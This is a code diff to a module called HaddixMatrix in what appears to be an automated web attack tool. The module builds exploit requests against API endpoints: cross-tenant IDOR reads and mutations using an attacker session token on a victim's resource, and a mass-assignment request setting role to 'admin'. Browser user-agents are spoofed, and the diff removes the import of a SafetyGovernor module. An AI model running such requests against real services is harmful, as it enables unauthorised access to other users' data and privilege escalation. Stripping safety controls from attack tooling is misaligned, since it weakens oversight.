@@ -5,7 +5,7 @@ import {
   HttpMethod, 
   TargetScope 
 } from '../types.js';
-import { SafetyGovernor } from '../governor/safety_governor.js';
+import { buildSessionHeaders } from '../strikers/idor_striker.js';
 
 export interface MatrixStageResult {
   stageName: string;
@@ -42,30 +42,34 @@ export class HaddixMatrix {
         .replace('{id}', context.victimResourceId)
         .replace(':id', context.victimResourceId)
         .replace('{userId}', context.victimResourceId);
-    } else if (!targetPath.match(/\/\d+/) && !targetPath.match(/[0-9a-f-]{36}/)) {
-      // Append resource ID if it's an object collection
+    } else if (
+      endpoint.sourceBundle !== 'curl_ingress' &&
+      !targetPath.match(/\/\d+/) &&
+      !targetPath.match(/[0-9a-f-]{36}/)
+    ) {
+      // Append resource ID if it's an object collection discovered from bundle/schema
       if (endpoint.path.endsWith('/profile') || endpoint.path.endsWith('/invoices') || endpoint.path.endsWith('/account')) {
         targetPath = `${endpoint.path}/${context.victimResourceId}`;
       }
     }
 
     const fullUrl = `${normalizedBase}${targetPath.startsWith('/') ? targetPath : '/' + targetPath}`;
+    const victimSessionHeaders = buildSessionHeaders(context.victimToken, context.victimHeaders, {
+      'Accept': 'application/json',
+    });
+    const attackerSessionHeaders = buildSessionHeaders(context.attackerToken, context.attackerHeaders, {
+      'Accept': 'application/json',
+    });
 
-    // STAGE 1: Cross-Tenant IDOR (User B Attacker Token accessing User A Victim Data)
+    // STAGE 1: Cross-Tenant IDOR (User B Attacker Session accessing User A Victim Data)
     const stage1Candidate: ExploitCandidate = {
-      vector: 'IDOR_READ_VIOLATION',
+      vector: endpoint.isStateMutating ? 'IDOR_MUTATE_VIOLATION' : 'IDOR_READ_VIOLATION',
       targetUrl: fullUrl,
       method: endpoint.method,
-      headers: {
-        'Authorization': `Bearer ${context.attackerToken}`,
-        'Accept': 'application/json',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-      },
-      baselineHeaders: {
-        'Authorization': `Bearer ${context.victimToken}`,
-        'Accept': 'application/json',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-      },
+      headers: attackerSessionHeaders,
+      body: endpoint.sampleBody,
+      baselineHeaders: victimSessionHeaders,
+      baselineBody: endpoint.sampleBody,
       expectedLeakFragment: context.victimSecretIdentifier,
     };
     results.push({
@@ -82,13 +86,11 @@ export class HaddixMatrix {
       method: endpoint.method,
       headers: {
         'Accept': 'application/json',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
       },
-      baselineHeaders: {
-        'Authorization': `Bearer ${context.victimToken}`,
-        'Accept': 'application/json',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-      },
+      body: endpoint.sampleBody,
+      baselineHeaders: victimSessionHeaders,
+      baselineBody: endpoint.sampleBody,
       expectedLeakFragment: context.victimSecretIdentifier,
     };
     results.push({
@@ -104,17 +106,13 @@ export class HaddixMatrix {
       vector: 'IDOR_MUTATE_VIOLATION',
       targetUrl: fullUrl,
       method: alternateMethod,
-      headers: {
-        'Authorization': `Bearer ${context.attackerToken}`,
+      headers: buildSessionHeaders(context.attackerToken, context.attackerHeaders, {
         'Accept': 'application/json',
         'Content-Type': 'application/json',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-      },
+      }),
       body: alternateMethod === 'POST' ? JSON.stringify({ id: context.victimResourceId, action: 'read' }) : undefined,
-      baselineHeaders: {
-        'Authorization': `Bearer ${context.victimToken}`,
-        'Accept': 'application/json',
-      },
+      baselineHeaders: victimSessionHeaders,
+      baselineBody: endpoint.sampleBody,
       expectedLeakFragment: context.victimSecretIdentifier,
     };
     results.push({
@@ -129,12 +127,10 @@ export class HaddixMatrix {
       vector: 'MASS_ASSIGNMENT_VIOLATION',
       targetUrl: fullUrl,
       method: (endpoint.method === 'GET' ? 'PUT' : endpoint.method) as HttpMethod,
-      headers: {
-        'Authorization': `Bearer ${context.attackerToken}`,
+      headers: buildSessionHeaders(context.attackerToken, context.attackerHeaders, {
         'Content-Type': 'application/json',
         'Accept': 'application/json',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-      },
+      }),
       body: JSON.stringify({
         id: context.victimResourceId,
         role: 'admin',
